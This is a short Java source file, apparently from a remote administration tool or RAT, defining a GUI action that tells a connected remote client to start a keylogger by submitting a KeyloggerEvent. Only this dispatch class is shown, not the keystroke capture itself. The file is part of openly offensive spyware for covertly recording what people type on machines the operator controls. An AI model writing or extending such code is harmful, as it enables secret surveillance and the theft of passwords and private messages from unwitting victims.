package TableUtils.KeyLogger.Actions;

import Server.Client;
import Utilities.AbstractActionGUI;
import Utilities.AbstractDialogCreator;
import Utilities.GetSYS;
import TableUtils.KeyLogger.Constants.KeyLog;
import TableUtils.KeyLogger.Events.KeyloggerEvent;

import java.awt.event.ActionEvent;

public class KeyLoggerAction extends AbstractActionGUI<AbstractDialogCreator> {

    private final KeyLog keyLog;

    public KeyLoggerAction(KeyLog keyLog) {
        super(null);
        this.keyLog = keyLog;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Client client = GetSYS.getClientHandler();
        assert client != null;
        client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
    }
}
